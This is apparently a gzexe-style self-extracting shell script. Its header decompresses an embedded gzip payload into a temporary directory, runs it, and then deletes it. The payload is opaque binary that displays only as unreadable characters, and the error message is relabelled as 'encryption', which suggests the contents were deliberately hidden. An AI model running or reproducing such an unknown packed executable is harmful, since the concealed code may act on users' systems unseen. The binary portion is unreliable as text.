#!/bin/sh
skip=50
set -e

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=$TMPDIR/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "奈雨の加密 $0"
  (exit 127); res=127
fi; exit $res
�     �TK��F�����,��ؒf��^&8���ǂ�1DK�5j�Ewkǃ��7���B!���r������g�[�B�%��d�$��ꫯ���*�C��X^C]�܆[<O����J`/֢�����F� ��%��R��|W��ZE�|-��E�r��8��`�V%�\��K(�#[���<nn�}��f��jQ̧�+���~�xr���2q�=:��,Q>U(b�S����9r�TMc������ڱD^T�t�1T�#���s��q2�Z����u�g��2S�%���ߧ*L�Wr�����C�D�8ځ]�\�r)]�"�,���}����,���q&4Rٰ)w�+��n� �U^j���m���p?���p&��q*���fԒO���̪"����x�T}=P'�N�G��Ҡq��a��.�ܽ�.�ؽsi��`��&�ٶ+��IY;0a��tc3��&ZM	_d�]��7����F����`�"k���h��� l�Ӓ��s֟|����u��VW;;5~�?�s���θ45��ǌU"lJ��;<���ѯ�V/��������:QG������ճ����7O����Ï��������?V�z��3���T�xYS7(�~{�t�jz'�g���	r�����"U��s!�݌�Q�.�36�M�ު�/x���8OM��ַ�u��lK��
�ʵ/�����h�;q�#bw����"�z3���h�D!l��!���a�/�'I3:��-B����o`!H�5�ݫ9�a&� )�51���W� u���L�������i@��ߺZX����v~��&�[˽�z]�����  